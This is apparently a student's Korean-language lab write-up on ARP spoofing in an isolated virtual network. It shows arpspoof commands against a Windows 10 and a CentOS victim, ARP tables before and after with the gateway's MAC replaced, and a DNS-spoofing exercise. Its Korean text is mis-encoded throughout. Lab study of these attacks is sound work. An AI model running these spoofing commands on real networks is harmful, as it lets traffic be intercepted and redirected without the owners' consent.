# ARP Spoofing

## κ°μ”

- MAC Addressλ¥Ό μ†μ—¬ LANμ—μ„μ ν†µμ‹  νλ¦„μ„ μ™κ³΅μ‹ν‚¤λ” κΈ°λ²•μ„ λ§ν•λ‹¤.
- ARP ν…μ΄λΈ”μ΄ λ°”λ€λ©΄ κ²½κ³ λ¥Ό λ³΄λ‚΄λ” ν΄μ„ ν†µν•΄ μ–΄λ μ •λ„λ” μλ°©ν•  μ μμ§€λ§ κ·Όλ³Έμ μΌλ΅ TCP/IP ν”„λ΅ν† μ½ μμ²΄μ λ¬Έμ μ΄κΈ° λ•λ¬Έμ— ARP Spoofingμ— λ€ν• λ³΄μ• λ€μ±…μ€ μ—†λ‹¤.

### ARP ν…μ΄λΈ”
- IPμ£Όμ†μ™€ ν•΄λ‹Ή μ£Όμ†μ— λ€ν• MAC Address λ©λ΅μ„ λ§ν•λ‹¤.
- 'cmd'μ°½μ—μ„ 'arp -a' λ¥Ό ν†µν•΄μ„ ν™•μΈν•  μ μλ‹¤.

## μ‹¤μµ 1. κΈ°λ³Έ μ‹¤μµ (IPλ¥Ό μ΄μ©ν• κ³µκ²©)
### π–¥οΈ μ‹¤μµ ν™κ²½(NAT)
```
- Attacker(Kali)        192.168.10.134 / c / 192.168.10.2 / 192.168.10.2
- Victim(Windows 10)    192.168.10.130 / c / 192.168.10.2 / 192.168.10.2
``` 

```
[samadal@kali ~]$ sudo ip link show eth0
[sudo] password for samadal:
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP mode DEFAULT group default qlen 1000
    link/ether 00:0c:29:b2:04:58 brd ff:ff:ff:ff:ff:ff

[samadal@kali ~]$ sudo arp -a
_gateway (192.168.10.2) at 00:50:56:e0:28:a3 [ether] on eth0
? (192.168.10.1) at 00:50:56:c0:00:08 [ether] on eth0

[samadal@kali ~]$ ifconfig eth0
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.10.134  netmask 255.255.255.0  broadcast 192.168.10.255
        inet6 fe80::20c:29ff:feb2:458  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:b2:04:58  txqueuelen 1000  (Ethernet)
        RX packets 186  bytes 29318 (28.6 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 149  bytes 20777 (20.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

```
kali            (192.168.10.134) / 00:0c:29:b2:04:58
Windows 10      (192.168.10.132) / 00-0C-29-BE-47-CB
G/W             (192.168.10.2)   / 00:50:56:e0:28:a3

```  
## ARP Spoofingμ„ μ΄μ©ν• MAC Address λ³€κ²½

```
sudo dsniff
```
```
sudo arpspoof -i eth0 -t 192.168.10.130 192.168.10.2
```
- λ…λ Ήμ–΄ μ‹¤ν–‰ μ „
```
kali            (192.168.10.134) / 00:0c:29:b2:04:58
Windows 10      (192.168.10.132) / 00-0C-29-BE-47-CB
G/W             (192.168.10.2)   / 00:50:56:e0:28:a3
```
![μ „](./img/μ¤ν‘Έν•‘img/1.png)
- λ…λ Ήμ–΄ μ‹¤ν–‰ ν›„
```
kali            (192.168.10.134) / 00:0c:29:b2:04:58
Windows 10      (192.168.10.132) / 00-0C-29-BE-47-CB
G/W             (192.168.10.2)   / 00:0c:29:b2:04:58
```
![ν›„](./img/μ¤ν‘Έν•‘img/2.png)

## κ²°λ΅ 
- κ³µκ²©μ„ ν•κ³  μλ” λ™μ•λ§ MAC Addressκ°€ λ³€κ²½λλ‹¤.

## μ‹¤μµ 2. μ‘μ© μ‹¤μµ (λ„λ©”μΈμ„ μ΄μ©ν• κ³µκ²©)

### κ°μ”
- CentOSμ—μ„ DNSμ„λ²„μ™€ Web μ„λ²„λ¥Ό κµ¬μ¶•ν•λ‹¤.
- Kaliμ—μ„ ARP Spoofing κ³µκ²©μ„ μ‹λ„ν•λ‹¤.
- Window 10μ—μ„ μ‚¬μ΄νΈ μ¶λ ¥μ„ ν™•μΈν•κ³  λ³€μ΅°λ κ²ƒμ„ ν™•μΈν•λ‹¤.

### π–¥οΈ μ‹¤μµ ν™κ²½(NAT)
```
- Attacker(Kali)        192.168.10.134 / c / 192.168.10.2 / 192.168.10.132
- Victim(CentOS)        192.168.10.132 / c / 192.168.10.2 / 192.168.10.132
- ν™•μΈ(Windows 10)       192.168.10.130 / c / 192.168.10.2 / 192.168.10.132
``` 

### Step 1. 3κ°μ μ‹μ¤ν…μ— IPλ¥Ό μ„¤μ •

### Step 2. CentOSμ—μ„ 'Kali'μ— νΈμ¤νΈ λ¶€μ—¬

### Step 3. windows 10μ—μ„ λ„¤μ„μ„λ²„ μ΅°νλ¥Ό ν•κ³  'MAC Address'λ΅ ν™•μΈν•λ‹¤.

![ν›„](./img/μ¤ν‘Έν•‘img/3.png)

### Step 4. Windows 10μ—μ„ 'μ‚¬μ΄νΈ(www.gusiya.com)'λ¥Ό μ¶λ ¥ν•λ‹¤.

![ν›„](./img/μ¤ν‘Έν•‘img/4.png)


### Step 5. 'kali'μ—μ„ μ‹μ¤ν… μ¬κµ¬μ„±

- Apache2 ν¨ν‚¤μ§€ μ„¤μΉ, λ°©ν™”λ²½ μ¶”κ°€ ν›„ ν™μ„±ν™”
- μ‚¬μ΄νΈ μ¶λ ¥ <br>
![ν›„](./img/μ¤ν‘Έν•‘img/5.png)

### Step 6. 'Kali' μ—μ„ 'DNS Spoofing'μΌλ΅ λ‘ μ‹μ¤ν…μ— κ³µκ²©μ„ μ‹¤ν–‰ν•λ‹¤.
```
sudo arpspoof -i eth0 -t 192.168.10.130 192.168.10.2
```
- windows 10<br>

![ν›„](./img/μ¤ν‘Έν•‘img/6.png)

β†’ λ¨λ‘ μ •μƒμ μΌλ΅ μ¶λ ¥μ΄ λλ‹¤.<br>

β†’ κ·Έ μ΄μ λ” **'windows 10'** λ‹¨μ§€ μ‚¬μ΄νΈλ¥Ό μ¶λ ¥λ§ ν•κ³  μκΈ° λ•λ¬Έμ— μ‹¤μ  κ³µκ²©μ„ λ°›μ•μ§€λ§ μ‚¬μ΄νΈλ” μ•„λ¬΄λ° μν–¥μ„ λ°›μ§€ μ•λ”λ‹¤.<br>

```
sudo arpspoof -i eth0 -t 192.168.10.132 192.168.10.2
```
![ν›„](./img/μ¤ν‘Έν•‘img/7.png) <br>
μ΄κ²ƒλ„ λ³€ν™”κ°€ μ—†λ‹¤. <br>

![μ„Όν† μ¤](./img/μ¤ν‘Έν•‘img/8.png) <br>
```
ν„μ¬ arp -a μ¶λ ¥μ—μ„ ν™•μΈλ μ‚¬ν•­
192.168.10.2 (gateway) μ™€ 192.168.10.134 (attack.gusiya.com)μ΄ λ™μΌν• MAC μ£Όμ† (00:0c:29:b2:04:58) λ¥Ό κ°€μ§.

μ΄λ” μΌλ°μ μΌλ΅ ARP μ¤ν‘Έν•‘(μ„μ΅°) λλ” ARP ν¬μ΄μ¦λ‹ κ³µκ²©μ μ§•ν›„μ…λ‹λ‹¤.
```
λ³€ν™”
